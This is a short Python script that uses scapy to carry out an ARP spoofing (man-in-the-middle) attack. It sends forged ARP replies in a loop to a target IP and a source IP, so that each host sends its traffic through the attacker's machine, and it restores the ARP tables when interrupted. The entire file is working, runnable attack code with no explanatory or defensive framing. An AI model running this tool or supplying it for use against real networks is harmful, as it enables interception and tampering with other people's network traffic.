#!/usr/bin/env python
import argparse
import time
import scapy.all as scapy


def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-s", "--source", dest="source", help="Source IP")
    options = parser.parse_args()
    if not options.target:
        print("Please specify the target, use --help for more info")
        exit()
    elif not options.source:
        print("Please specify the source, use --help for more info")
        exit()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packet_count = 0
ips = arguments()
try:
    while True:
        spoof(ips.target, ips.source)
        spoof(ips.source, ips.target)
        sent_packet_count += 2
        print("\r[+] Packets sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Resetting ARP tables")
    restore(ips.target, ips.source)
    restore(ips.source, ips.target)
